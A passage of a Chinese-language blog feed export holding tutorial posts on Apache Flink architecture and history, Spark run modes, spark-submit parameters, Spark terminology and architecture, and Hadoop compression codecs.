TaskManager。</li><li>Client 客户端不是运行时和程序执行的一部分，而是用于准备数据流并将其发送给 JobManager。</li><li>提交任务完成之后，Client可以断开连接（分离模式），或保持连接来接收进程报告（附加模式）。</li><li>Client可以作为触发执行 Java&#x2F;Scala 程序的一部分运行，也可以在命令行进程.&#x2F;bin&#x2F;flink run …中运行。</li><li>可以通过多种方式启动 JobManager 和 TaskManager：直接在机器上作为standalone 集群启动、在容器中启动、或者通过YARN或Mesos等资源框架管理并启动。TaskManager 连接到 JobManagers，宣布自己可用，并被分配工作。</li><li>Actor System<ul><li>各个角色组件互相通信的消息传递系统中间件。</li><li>Actor是一种并发编程模型，与另一种模型共享内存完全相反，Actor模型share nothing，即没有任何共享。</li><li>所有的线程(或进程)通过消息传递的方式进行合作(通信)，这些线程(或进程)称为Actor。</li><li>以其简单、高效著称</li><li>缺点<ul><li>唯一的缺点是不能实现真正意义上的并行， 而是通过并发实现的并行效果，会存在一定的不确定性。</li><li>纯消息通信，实时性和粒度控制上会略弱于共享内存的方式。</li></ul></li></ul></li></ul><h2 id="3-3-核心组成角色剖析"><a href="#3-3-核心组成角色剖析" class="headerlink" title="3.3 核心组成角色剖析"></a>3.3 核心组成角色剖析</h2><ul><li>JobManager<ul><li>JobManager 具有许多与协调 Flink 应用程序的分布式执行有关的职责：<ul><li>它决定何时调度下一个 task（或一组 task）、对完成的 task 或执行失败做出反应、协调 checkpoint、并且协调从失败中恢复等等。这个进程由三个不同的组件组成：<ul><li>ResourceManager<ul><li>ResourceManager 负责 Flink 集群中的资源提供、回收、分配 - 它管理 task slots，这是 Flink 集群中资源调度的最小单位。Flink 为不同的环境和资源提供者（例如 YARN、Mesos、Kubernetes 和 standalone 部署）实现了对应的 ResourceManager。在 standalone 设置中，ResourceManager 只能分配可用 TaskManager 的 slots，而不能自行启动新的 TaskManager。</li></ul></li><li>Dispatcher<ul><li>Dispatcher 提供了一个 REST 接口，用来提交 Flink 应用程序执行，并为每个提交的作业启动一个新的 JobMaster。它还运行 Flink WebUI 用来提供作业执行信息。</li></ul></li><li>JobMaster<ul><li>JobMaster 负责管理单个JobGraph的执行。Flink 集群中可以同时运行多个作业，每个作业都有自己的 JobMaster。</li><li>始终至少有一个 JobManager。高可用（HA）设置中可能有多个 JobManager，其中一个始终是 leader，其他的则是 standby。</li></ul></li></ul></li></ul></li></ul></li><li>TaskManager<ul><li>TaskManager（也称为 worker）执行作业流的 task，并且缓存和交换数据流。</li><li>必须始终至少有一个 TaskManager。在 TaskManager 中资源调度的最小单位是 task slot。</li><li>TaskManager 中 task slot 的数量表示并发处理 task 的数量。请注意一个 task slot 中可以执行多个算子。</li></ul></li></ul><h2 id="3-4-yarn模式提交任务的工作流程"><a href="#3-4-yarn模式提交任务的工作流程" class="headerlink" title="3.4 yarn模式提交任务的工作流程"></a>3.4 yarn模式提交任务的工作流程</h2><ul><li>工作流程图：</li></ul><p><img src="/blog/50ac08de.html/1630325042367-d709bf3d-24b0-4907-9f10-64693abdf588.png"></p>]]></content>
      
      
      <categories>
          
          <category> Flink </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flink 概述</title>
      <link href="/blog/72cd4c87.html/"/>
      <url>/blog/72cd4c87.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：产生背景"><a href="#一：产生背景" class="headerlink" title="一：产生背景"></a>一：产生背景</h1><h2 id="1-1-历史背景"><a href="#1-1-历史背景" class="headerlink" title="1.1 历史背景"></a>1.1 历史背景</h2><ul><li>随着互联网应用的快速发展，<code>实时流数据产生日益增多和普遍化</code>。如日常生活、金融、驾驶、LBS、电商等众多领域。</li><li>实时数据的处理和挖掘能够带来离线数据处理和挖掘<code>更多的社会发展和商业价值</code>。</li><li>如何快速响应和处理这些大规模的实时数据流，成为众多互联网大厂的当务之急。</li><li>在flink之前也出现了很多<code>流数据处理引擎</code>，包括storm、sparkstreaming等知名流行框架，但各自均有较明显的不足，导致没有达到理想的流处理引擎的标准要求。</li></ul><h2 id="1-2-优秀的流处理引擎"><a href="#1-2-优秀的流处理引擎" class="headerlink" title="1.2 优秀的流处理引擎"></a>1.2 优秀的流处理引擎</h2><ul><li>优秀流处理引擎标准要求<ul><li>低延迟、高吞吐量、容错性、窗口时间语义化、编程效率高与运行效果好的用户体验；</li></ul></li><li>storm<ul><li>优点：低延迟</li><li>缺点：其它要求都较差一些</li></ul></li><li>sparkstreaming<ul><li>优点：高吞吐量、容错性高</li><li>缺点：其它要求都较差一些</li></ul></li></ul><h1 id="二：基本介绍"><a href="#二：基本介绍" class="headerlink" title="二：基本介绍"></a>二：基本介绍</h1><h2 id="2-1-概念说明"><a href="#2-1-概念说明" class="headerlink" title="2.1 概念说明"></a>2.1 概念说明</h2><ul><li>由Apache软件基金会开发的开源流处理框架</li><li>其核心是用Java和Scala编写的框架和分布式处理引擎</li><li>用于对无界和有界数据流进行有状态计算。<ul><li>无界数据流: 即为实时流数据；</li><li>有界数据流：即为离线数据，也称为批处理数据；</li></ul></li></ul><h2 id="2-2-特点特征"><a href="#2-2-特点特征" class="headerlink" title="2.2 特点特征"></a>2.2 特点特征</h2><ul><li>被设计为在所有常见的集群环境中运行，以内存速度和任何规模执行计算。</li><li>能够达到实时流处理引擎的全部标准要求。<ul><li>低延迟、高吞吐量、容错性、窗口时间语义化、编程效率高与运行效果好的用户体验；</li></ul></li></ul><h1 id="三：应用场景"><a href="#三：应用场景" class="headerlink" title="三：应用场景"></a>三：应用场景</h1><h2 id="3-1-官方说明"><a href="#3-1-官方说明" class="headerlink" title="3.1 官方说明"></a>3.1 官方说明</h2><ul><li>事件驱动型应用</li><li>数据分析型应用</li><li>数据管道 ETL</li></ul><h2 id="3-2-实际情况"><a href="#3-2-实际情况" class="headerlink" title="3.2 实际情况"></a>3.2 实际情况</h2><ul><li>要求严格的实时流处理场景</li></ul><h1 id="四：代码实现"><a href="#四：代码实现" class="headerlink" title="四：代码实现"></a>四：代码实现</h1><h2 id="4-1-实现方式"><a href="#4-1-实现方式" class="headerlink" title="4.1 实现方式"></a>4.1 实现方式</h2><ul><li>Java API</li><li>Scala API</li></ul><h2 id="4-2-统一数据处理过程抽象"><a href="#4-2-统一数据处理过程抽象" class="headerlink" title="4.2 统一数据处理过程抽象"></a>4.2 统一数据处理过程抽象</h2><ul><li>将实时和批处理的数据过程，均抽象成三个过程，即Source-&gt;Transform-&gt;Sink。<ul><li>Source为源数据读入，即Source算子。</li><li>Transform是数据转换处理过程，即Transform算子。</li><li>Sink即数据接收器，即数据落地到存储层，即Sink算子。</li></ul></li><li>代码实现复杂度<ul><li>丰富的API和算子操作；</li><li>抽象封装统一性较高，支持类SQL编程，编程复杂度并不高。</li></ul></li></ul><h1 id="五：版本发展"><a href="#五：版本发展" class="headerlink" title="五：版本发展"></a>五：版本发展</h1><table><thead><tr><th><strong>版本</strong></th><th><strong>发行日期</strong></th><th><strong>备注</strong></th></tr></thead><tbody><tr><td><strong>Flink 0.6-incubating</strong></td><td><strong>2014-08-26</strong></td><td><strong>初步得到团队内部认可，正在快速迭代中</strong></td></tr><tr><td><strong>Flink 0.9.0-milestone</strong></td><td><strong>2015-04-13</strong></td><td><strong>有重大进展，得正式对外发布，</strong></td></tr><tr><td><strong>0.9</strong></td><td><strong>2015-09-01</strong></td><td><strong>从此时开始引入阿里巴巴，并成为阿里系主干业务实时流处理引擎，内部改良优化后命名为blink</strong></td></tr><tr><td>0.10</td><td>2016-02-11</td><td></td></tr><tr><td><strong>1.0</strong></td><td><strong>2016-05-11</strong></td><td><strong>很有里程碑、代表性的一个版本</strong></td></tr><tr><td>1.1</td><td>2017-03-22</td><td></td></tr><tr><td>1.2</td><td>2017-04-26</td><td></td></tr><tr><td>1.3</td><td>2018-03-15</td><td></td></tr><tr><td>1.4</td><td>2018-03-08</td><td></td></tr><tr><td>1.5</td><td>2018-10-29</td><td></td></tr><tr><td>1.6</td><td>2018-10-29</td><td></td></tr><tr><td><strong>1、在2019年初，blink在阿里内部经过多年的商用实践，增加了N多新特性，并得到广泛应用和成熟化，正式对外开源，并捐赠给Apache Flink社区，并成为其下的分支方式开源并逐步融合后，依然以Flink为主进一步推进开源进程。****2、阿里系以9000万欧元收购了创业公司 Data Artisans，即Flink的开发团队所属公司。</strong></td><td></td><td></td></tr><tr><td>1.7</td><td>2019-02-15</td><td></td></tr><tr><td>1.8</td><td>2019-04-09</td><td></td></tr><tr><td><strong>1.9</strong></td><td><strong>2019-08-19</strong></td><td><strong>目前市占率较高的一个版本</strong></td></tr><tr><td>1.10</td><td>2020-02-11</td><td></td></tr><tr><td>1.11</td><td>2020-07-06</td><td><strong>从此版本开始，加入很多新特性，支持hadoop3.x版本</strong></td></tr><tr><td>1.12</td><td>2020-12-08</td><td></td></tr><tr><td>Flink 1.13.0</td><td>2021-04-30</td><td></td></tr><tr><td><strong>Flink 1.13.1</strong></td><td><strong>2021-05-28</strong></td><td><strong>版本迭代很快，社区很活跃，发展非常快****已是稳定版。</strong></td></tr></tbody></table><ul><li>Flink版本在早期就得到阿里认可，并进行集团内部孵化和二次开发、商用实践，命名为Blink。</li><li>Blink的主要贡献是在用户体验上，包括SQL、webUI等方面。</li><li>在2019年进行了开源反馈给社区，从此更多的是以Flink merge Blink新功能后，以Flink为主继续推进开源。</li><li>基于市场量、成熟度、社区丰富度等方面，通常选择1.13.1版本。</li></ul><h1 id="六：市场前景"><a href="#六：市场前景" class="headerlink" title="六：市场前景"></a>六：市场前景</h1><ul><li>现实情况<ul><li>学习成本较高、应用场景较垂直，其实际开发者在市场上是比较衡缺的。</li><li>相对于更广大的中小型公司，Flink的使用量最主要是集中在中大型互联网科技公司。</li></ul></li><li>发展趋势<ul><li>商业市场、各种大型IT企业对大规模实时数据场景需求旺盛。</li><li>Flink在实时数据处理方面的架构设计与商用实践表现较为突出。</li><li>得到阿里系的商业收购+大规模人力财力物力的支持，未来发展不可限量。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Flink </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark 交互操作</title>
      <link href="/blog/75610dc7.html/"/>
      <url>/blog/75610dc7.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Spark-运行模式"><a href="#一：Spark-运行模式" class="headerlink" title="一：Spark 运行模式"></a>一：Spark 运行模式</h1><p>即作业以什么样的模式去执行，主要是单机、分布式两种方式的细节选择。</p><table><thead><tr><th><strong>序号</strong></th><th align="center"><strong>模式名称</strong></th><th align="center"><strong>特点</strong></th><th align="center"><strong>应用场景</strong></th></tr></thead><tbody><tr><td>1</td><td align="center">本地运行模式(local)</td><td align="center">单台机器多线程来模拟spark分布式计算</td><td align="center">机器资源不够测试验证程序逻辑的正确性</td></tr><tr><td>2</td><td align="center">伪分布式模式</td><td align="center">单台机器多进程来模拟spark分布式计算</td><td align="center">机器资源不够测试验证程序逻辑的正确性</td></tr><tr><td>3</td><td align="center">standalone(client)</td><td align="center">独立布署spark计算集群自带clustermanagerdriver运行在spark submit client端</td><td align="center">机器资源充分纯用spark计算框架任务提交后在spark submit   client端实时查看反馈信息数据共享性弱测试使用还可以，生产环境极少使用该种模式</td></tr><tr><td>4</td><td align="center">standalone(cluster)</td><td align="center">独立布署spark计算集群自带clustermanagerdriver运行在spark worker node端</td><td align="center">机器资源充分纯用spark计算框架任务提交后将退出spark   submit client端数据共享性弱测试和生产环境均可以自由使用，但更多用于生产环境</td></tr><tr><td>5</td><td align="center">spark on yarn(yarn-client)</td><td align="center">以yarn集群为基础只添加spark计算框架相关包driver运行在yarn client上</td><td align="center">机器资源充分多种计算框架混用数据共享性强任务提交后在yarn client端实时查看反馈信息</td></tr><tr><td>6</td><td align="center">spark on yarn(yarn-cluster)</td><td align="center">以yarn集群为基础只添加spark计算框架相关包driver运行在集群的am contianer中</td><td align="center">机器资源充分多种计算框架混用数据共享性强任务提交后将退出yarn client端</td></tr><tr><td>7</td><td align="center">spark on mesos&#x2F;ec2</td><td align="center">与spark on yarn类似</td><td align="center">与spark on yarn类似在国内应用较少</td></tr></tbody></table><h1 id="二：Spark-用户交互方式"><a href="#二：Spark-用户交互方式" class="headerlink" title="二：Spark 用户交互方式"></a>二：Spark 用户交互方式</h1><ol><li>spark-shell：spark命令行方式来操作spark作业。<ul><li>多用于简单的学习、测试、简易作业操作。</li></ul></li><li>spark-submit：通过程序脚本，提交相关的代码、依赖等来操作spark作业。<ul><li>最多见的提交任务的交互方式，简单易用、参数齐全。</li></ul></li><li>spark-sql：通过sql的方式操作spark作业。<ul><li>sql相关的学习、测试、生产环境研发均可以使用该直接操作交互方式。</li></ul></li><li>spark-class：最低层的调用方式，其它调用方式多是最终转化到该方式中去提交。<ul><li>直接使用较少</li></ul></li><li>sparkR、sparkPython：通过其它非java、非scala语言直接操作spark作业的方式。<ul><li>R、python语言使用者的交互方式。</li></ul></li></ol><h1 id="三：Spark-Shell-操作"><a href="#三：Spark-Shell-操作" class="headerlink" title="三：Spark-Shell 操作"></a>三：Spark-Shell 操作</h1><h2 id="3-1-交互方式定位"><a href="#3-1-交互方式定位" class="headerlink" title="3.1 交互方式定位"></a>3.1 交互方式定位</h2><ul><li>一个强大的交互式数据操作与分析的工具，提供一个简单的方式快速学习spark相关的API。</li></ul><h2 id="3-2-启动方式"><a href="#3-2-启动方式" class="headerlink" title="3.2 启动方式"></a>3.2 启动方式</h2><ul><li>前置环境：已将spark-shell等交互式脚本已加入系统PATH变量，可在任意位置使用。</li><li>以本地2个线程来模拟运行spark相关操作，该数量一般与本机的cpu核数相一致为最佳spark-shell –master local[2]</li></ul><h2 id="3-3-相关参数"><a href="#3-3-相关参数" class="headerlink" title="3.3 相关参数"></a>3.3 相关参数</h2><ul><li>参数列表获取方式：spark-shell –help</li></ul><h1 id="四：Spark-submit-操作"><a href="#四：Spark-submit-操作" class="headerlink" title="四：Spark-submit 操作"></a>四：Spark-submit 操作</h1><h2 id="4-1-交互方式定位"><a href="#4-1-交互方式定位" class="headerlink" title="4.1 交互方式定位"></a>4.1 交互方式定位</h2><ul><li>最常用的通过程序脚本，提交相关的代码、依赖等来操作spark作业的方式。</li></ul><h2 id="4-2-启动方式"><a href="#4-2-启动方式" class="headerlink" title="4.2 启动方式"></a>4.2 启动方式</h2><ul><li>spark-submit提交任务的模板</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">spark-submit \</span><br><span class="line">  --class &lt;main-class&gt; \</span><br><span class="line">  --master &lt;master-url&gt; \</span><br><span class="line">  --jars jar_list_by_comma \</span><br><span class="line">  --conf &lt;key&gt;=&lt;value&gt; \</span><br><span class="line">  ... # other options</span><br><span class="line">  &lt;application-jar&gt; \</span><br><span class="line">  [application-arguments]</span><br></pre></td></tr></table></figure><h2 id="4-3-spark-submit-详细参数说明"><a href="#4-3-spark-submit-详细参数说明" class="headerlink" title="4.3 spark-submit 详细参数说明"></a>4.3 spark-submit 详细参数说明</h2><table><thead><tr><th align="center">参数名</th><th>参数说明</th></tr></thead><tbody><tr><td align="center">–master</td><td>master 的地址，提交任务到哪里执行，例如 spark:&#x2F;&#x2F;host:port,   yarn, local</td></tr><tr><td align="center">–deploy-mode</td><td>在本地 (client) 启动 driver 或在 cluster 上启动，默认是 client</td></tr><tr><td align="center">–class</td><td>应用程序的主类，仅针对 java 或 scala 应用</td></tr><tr><td align="center">–name</td><td>应用程序的名称</td></tr><tr><td align="center">–jars</td><td>用逗号分隔的本地jar 包，设置后，这些 jar 将包含在 driver 和 executor 的 classpath 下</td></tr><tr><td align="center">–packages</td><td>包含在driver 和executor 的  classpath 中的 jar 的 maven 坐标</td></tr><tr><td align="center">–exclude-packages</td><td>为了避免冲突   而指定不包含的 package</td></tr><tr><td align="center">–repositories</td><td>远程 repository</td></tr><tr><td align="center">–conf PROP&#x3D;VALUE</td><td>指定 spark 配置属性的值， 例如  -conf spark.executor.extraJavaOptions&#x3D;”-XX:MaxPermSize&#x3D;256m”</td></tr><tr><td align="center">–properties-file</td><td>加载的配置文件，默认为 conf&#x2F;spark-defaults.conf</td></tr><tr><td align="center">–driver-memory</td><td>Driver内存，默认 1G</td></tr><tr><td align="center">–driver-java-options</td><td>传给 driver 的额外的 Java 选项</td></tr><tr><td align="center">–driver-library-path</td><td>传给 driver 的额外的库路径</td></tr><tr><td align="center">–driver-class-path</td><td>传给 driver 的额外的类路径</td></tr><tr><td align="center">–driver-cores</td><td>Driver 的核数，默认是1。在 yarn 或者 standalone 下使用</td></tr><tr><td align="center">–executor-memory</td><td>每个 executor 的内存，默认是1G</td></tr><tr><td align="center">–total-executor-cores</td><td>所有 executor 总共的核数。仅仅在  mesos 或者 standalone 下使用</td></tr><tr><td align="center">–num-executors</td><td>启动的 executor 数量。默认为2。在 yarn 下使用</td></tr><tr><td align="center">–executor-core</td><td>每个 executor 的核数。在yarn或者standalone下使用</td></tr></tbody></table><h2 id="4-4-关于–master取值的特别说明"><a href="#4-4-关于–master取值的特别说明" class="headerlink" title="4.4 关于–master取值的特别说明"></a>4.4 关于–master取值的特别说明</h2><table><thead><tr><th>local</th><th>本地worker线程中运行spark，完全没有并行</th></tr></thead><tbody><tr><td>local[K]</td><td>在本地work线程中启动K个线程运行spark</td></tr><tr><td>local[*]</td><td>启动与本地work机器的core个数相同的线程数来运行spark</td></tr><tr><td>spark:&#x2F;&#x2F;HOST:PORT</td><td>连接指定的standalone集群的master，默认7077端口</td></tr><tr><td>mesos:&#x2F;&#x2F;HOST:PORT</td><td>连接到mesos集群，国内用的极少</td></tr><tr><td>yarn</td><td>使用yarn的cluster或者yarn的client模式连接。取决于–deploy-mode参数，由deploy-mode的取值为client或是cluster来最终决定。也可以用yarn-client或是yarn-cluster进行二合一参数使用，保留–master去掉—deploy-mode参数亦可。–master   yarn-client，相当于—master   yarn –deploy-mode client的二合一</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Spark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark 相关术语</title>
      <link href="/blog/f278f015.html/"/>
      <url>/blog/f278f015.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：RDD-Resilient-Distributed-DataSet"><a href="#一：RDD-Resilient-Distributed-DataSet" class="headerlink" title="一：RDD (Resilient Distributed DataSet)"></a>一：RDD (Resilient Distributed DataSet)</h1><ul><li>弹性分布式数据集，是对数据集在spark存储和计算过程中的一种抽象。</li><li>是一组只读、可分区的分布式数据集合。</li><li>一个RDD 包含多个分区Partition(类似于MapReduce中的InputSplit中的block)，分区是依照一定的规则的，将具有相同规则的属性的数据记录放在一起。</li><li>横向上可切分并行计算，以分区Partition为切分后的最小存储和计算单元。</li><li>纵向上可进行内外存切换使用，即当数据在内存不足时，可以用外存磁盘来补充。</li></ul><h1 id="二：Partition-（分区）"><a href="#二：Partition-（分区）" class="headerlink" title="二：Partition （分区）"></a>二：Partition （分区）</h1><ul><li>Partition类似hadoop的Split中的block，计算是以partition为单位进行的，提供了一种划分数据的方式。</li><li>Partition的划分依据有很多，常见的有Hash分区、范围分区等，也可以自己定义的，像HDFS文件，划分的方式就和MapReduce一样，以文件的block来划分不同的partition。</li><li>一个Partition交给一个Task去计算处理。</li></ul><h1 id="三：算子"><a href="#三：算子" class="headerlink" title="三：算子"></a>三：算子</h1><ul><li>英文简称：Operator，简称op</li><li>广义上讲，对任何函数进行某一项操作都可以认为是一个算子</li><li>通俗上讲，算子即为映射、关系、变换。</li><li>MapReduce算子，主要分为两个，即为Map和Reduce两个主要操作的算子，导致灵活可用性比较差。</li><li>Spark算子，分为两大类，即为Transformation和Action类，合计有80多个。</li></ul><h1 id="四：Transformation类算子"><a href="#四：Transformation类算子" class="headerlink" title="四：Transformation类算子"></a>四：Transformation类算子</h1><ul><li>操作是延迟计算的，也就是说从一个RDD 转换生成另一个 RDD 的转换操作不是马上执行，需要等到有 Action 操作的时候才会真正触发运算。</li><li>细分类<ul><li>Value数据类型的Transformation算子</li><li>Key-Value数据类型的Transfromation算子</li></ul></li></ul><h1 id="五：Action类算子"><a href="#五：Action类算子" class="headerlink" title="五：Action类算子"></a>五：Action类算子</h1><ul><li>会触发 Spark 提交作业（Job），并将数据输出 Spark 系统。</li></ul><h1 id="六：窄依赖"><a href="#六：窄依赖" class="headerlink" title="六：窄依赖"></a>六：窄依赖</h1><ul><li>如果一个父RDD的每个分区只被子RDD的一个分区使用 —-&gt; 一对一关系</li></ul><h1 id="七：宽依赖"><a href="#七：宽依赖" class="headerlink" title="七：宽依赖"></a>七：宽依赖</h1><ul><li>如果一个父RDD的每个分区要被子RDD 的多个分区使用 —-&gt; 一对多关系</li></ul><h1 id="八：Application"><a href="#八：Application" class="headerlink" title="八：Application"></a>八：Application</h1><ul><li>Spark Application的概念和MapReduce中的job或者yarn中的application类似，指的是用户编写的Spark应用程序，包含了一个Driver功能的代码和分布在集群中多个节点上运行的Executor代码</li><li>一般是指整个Spark项目从开发、测试、布署、运行的全部。</li></ul><h1 id="九：Driver"><a href="#九：Driver" class="headerlink" title="九：Driver"></a>九：Driver</h1><ul><li>运行main函数并且创建SparkContext的程序。</li><li>称为驱动程序，Driver Program类似于hadoop的wordcount程序中的driver类的main函数。</li></ul><h1 id="十：Cluster-Manager"><a href="#十：Cluster-Manager" class="headerlink" title="十：Cluster Manager"></a>十：Cluster Manager</h1><ul><li>集群的资源管理器，在集群上获取资源的服务。如Yarn、Mesos、Spark Standalone等。</li><li>以Yarn为例，驱动程序会向Yarn申请计算我这个任务需要多少的内存，多少CPU等，后由Cluster Manager会通过调度告诉驱动程序可以使用，然后驱动程序将任务分配到既定的Worker Node上面执行。</li></ul><h1 id="十一：WorkerNode"><a href="#十一：WorkerNode" class="headerlink" title="十一：WorkerNode"></a>十一：WorkerNode</h1><ul><li>集群中任何一个可以运行spark应用代码的节点。</li><li>Worker Node就是物理机器节点，可以在上面启动Executor进程。</li></ul><h1 id="十二：Executor"><a href="#十二：Executor" class="headerlink" title="十二：Executor"></a>十二：Executor</h1><ul><li>Application运行在Worker节点上的一个进程，该进程负责运行Task，并且负责将数据存在内存或者磁盘上，每个Application都有各自独立专享的一批Executor。</li><li>Executor即为spark概念的资源容器，类比于yarn的container容器，真正承载Task的运行与管理，以多线程的方式运行Task，更加高效快速。</li></ul><h1 id="十三：Task"><a href="#十三：Task" class="headerlink" title="十三：Task"></a>十三：Task</h1><ul><li>与Hadoop中的Map Task或者Reduce Task是类同的。</li><li>分配到executor上的基本工作单元，执行实际的计算任务。</li><li>Task分为两类，即为ShuffleMapTask和ResultTask。<ul><li>ShuffleMapTask：即为Map任务和发生Shuffle的任务的操作，由Transformation操作组成，其输出结果是为下个阶段任务(ResultTask)进行做准备，不是最终要输出的结果。</li><li>ResultTask：即为Action操作触发的Job作业的最后一个阶段任务，其输出结果即为Application最终的输出或存储结果。</li></ul></li></ul><h1 id="十四：Job（作业）"><a href="#十四：Job（作业）" class="headerlink" title="十四：Job（作业）"></a>十四：Job（作业）</h1><ul><li>Spark RDD里的每个action的计算会生成一个job。</li><li>用户提交的Job会提交给DAGScheduler（Job调度器），Job会被分解成Stage去执行，每个Stage由一组相同计算规则的Task组成，该组Task也称为TaskSet，实际交由TaskScheduler去调度Task的机器执行节点，最终完成作业的执行。</li></ul><h1 id="十五：Stage（阶段）"><a href="#十五：Stage（阶段）" class="headerlink" title="十五：Stage（阶段）"></a>十五：Stage（阶段）</h1><ul><li>Stage是Job的组成部分，每个Job可以包含1个或者多个Stage。</li><li>Job切分成Stage是以Shuffle作为分隔依据，Shuffle前是一个Stage，Shuffle后是一个Stage。即为按RDD宽窄依赖来划分Stage。  </li><li>每个Job会被拆分很多组Task，每组任务被称为Stage，也可称TaskSet，一个作业可以被分为一个或多个阶段。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark 架构设计</title>
      <link href="/blog/6a386de9.html/"/>
      <url>/blog/6a386de9.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：架构总览"><a href="#一：架构总览" class="headerlink" title="一：架构总览"></a>一：架构总览</h1><p><img src="/blog/6a386de9.html/1629182444027-d40b52f7-91de-4983-9fe1-c9c7e82c2a3d.png"></p><h1 id="二：角色作用"><a href="#二：角色作用" class="headerlink" title="二：角色作用"></a>二：角色作用</h1><ul><li>Client：面向用户，对外提供接口，提交代码的入口。</li><li>Driver Program：驱动器程序，用于解耦客户端和内部实际操作，将用户程序转化为任务。</li><li>SparkContent：Spark 上下文，承接作用，用于配置上下文环境。</li><li>Cluster Manager（Resource Manager）：集群资源管理器，统一资源管理与任务调度。</li><li>Application Master：任务的执行，调度指挥者。</li><li>Worker Node：工作节点，任务的实际执行者。</li></ul><h1 id="三：角色间关系"><a href="#三：角色间关系" class="headerlink" title="三：角色间关系"></a>三：角色间关系</h1><ol><li>客户端接收到用户指令、代码；</li><li>驱动器服务于客户端，承接指令传达给集群资源管理器；</li><li>集群资源管理器根据当前情况，进行资源调度，生成一个任务调度者 AM（Application Master）</li><li>AM 给相应的工作节点分配任务；</li><li>工作节点执行任务，执行完毕，结果返回给 AM，并向资源管理器汇报自身资源情况，任务已完成当前空闲状态。</li><li>AM 接收到计算结果进行汇总，返回给客户端。</li></ol><h1 id="四：工作特性"><a href="#四：工作特性" class="headerlink" title="四：工作特性"></a>四：工作特性</h1><ul><li>内存计算</li><li>多线程</li><li>缓存</li><li>每一个 AM 都有一批专享的 Executor，以多线程方式启动多个 Task 任务，并行的线程计算任务缓存 RDD数据缓存块，存储复用的数据模块。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop 数据压缩</title>
      <link href="/blog/40919b9a.html/"/>
      <url>/blog/40919b9a.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><h2 id="1-1-优缺点"><a href="#1-1-优缺点" class="headerlink" title="1.1 优缺点"></a>1.1 优缺点</h2><ul><li>压缩的优点：以减少磁盘 IO、减少磁盘存储空间。</li><li>压缩的缺点：增加 CPU 开销。</li></ul><h2 id="1-2-压缩原则"><a href="#1-2-压缩原则" class="headerlink" title="1.2 压缩原则"></a>1.2 压缩原则</h2><ul><li>运算密集型的 Job，少用压缩</li><li>IO 密集型的 Job，多用压缩</li></ul><h1 id="二：MR-支持的压缩编码"><a href="#二：MR-支持的压缩编码" class="headerlink" title="二：MR 支持的压缩编码"></a>二：MR 支持的压缩编码</h1><h2 id="2-1-压缩算法对比介绍"><a href="#2-1-压缩算法对比介绍" class="headerlink" title="2.1 压缩算法对比介绍"></a>2.1 压缩算法对比介绍</h2><table><thead><tr><th>压缩格式</th><th>Hadoop 是否自带</th><th>算法</th><th>文件扩展名</th><th>是否可切片</th><th>换成压缩格式后，原来的程序是否需要修改</th></tr></thead><tbody><tr><td>DEFLATE</td><td>是，直接使用</td><td>DEFLATE</td><td>.deflate</td><td>否</td><td>和文本处理一样，不需要修改</td></tr><tr><td>Gzip</td><td>是，直接使用</td><td>DEFLATE</td><td>.gz</td><td>否</td><td>和文本处理一样，不需要修改</td></tr><tr><td>bzip2</td><td>是，直接使用</td><td>bzip2</td><td>.bz2</td><td>是</td><td>和文本处理一样，不需要修改</td></tr><tr><td>LZO</td><td>否，需要安装</td><td>LZO</td><td>.lzo</td><td>是</td><td>需要建索引，还需要指定 输入格式</td></tr><tr><td>Snappy</td><td>是，直接使用</td><td>Snappy</td><td>.snappy</td><td>否</td><td>和文本处理一样，不需要修改</td></tr></tbody></table><h2 id="2-2-压缩性能的比较"><a href="#2-2-压缩性能的比较" class="headerlink" title="2.2 压缩性能的比较"></a>2.2 压缩性能的比较</h2><table><thead><tr><th>压缩算法</th><th>原始文件大小</th><th>压缩文件大小</th><th>压缩速度</th><th>解压速度</th></tr></thead><tbody><tr><td>gzip</td><td>8.3GB</td><td>1.8GB</td><td>17.5MB&#x2F;s</td><td>58MB&#x2F;s</td></tr><tr><td>bzip2</td><td>8.3GB</td><td>1.1GB</td><td>2.4MB&#x2F;s</td><td>9.5MB&#x2F;s</td></tr><tr><td>LZO</td><td>8.3GB</td><td>2.9GB</td><td>49.3MB&#x2F;s</td><td>74.6MB&#x2F;s</td></tr></tbody></table><p><a href="http://google.github.io/snappy/">http://google.github.io/snappy/</a></p><p>Snappy compresses at about 250 MB&#x2F;sec or more and decompresses at about 500 MB&#x2F;sec or more.</p><h1 id="三：压缩方式选择"><a href="#三：压缩方式选择" class="headerlink" title="三：压缩方式选择"></a>三：压缩方式选择</h1><p>压缩方式选择时重点考虑：</p><ul><li>压缩&#x2F;解压缩速度</li><li>压缩率（压缩后存储大小）</li><li>压缩后是否 可以支持切片。</li></ul><h2 id="3-1-Gzip-压缩"><a href="#3-1-Gzip-压缩" class="headerlink" title="3.1 Gzip 压缩"></a>3.1 Gzip 压缩</h2><ul><li>优点：压缩率比较高；</li><li>缺点：不支持 Split；压缩&#x2F;解压速度一般；</li></ul><h2 id="3-2-Bzip2-压缩"><a href="#3-2-Bzip2-压缩" class="headerlink" title="3.2 Bzip2 压缩"></a>3.2 Bzip2 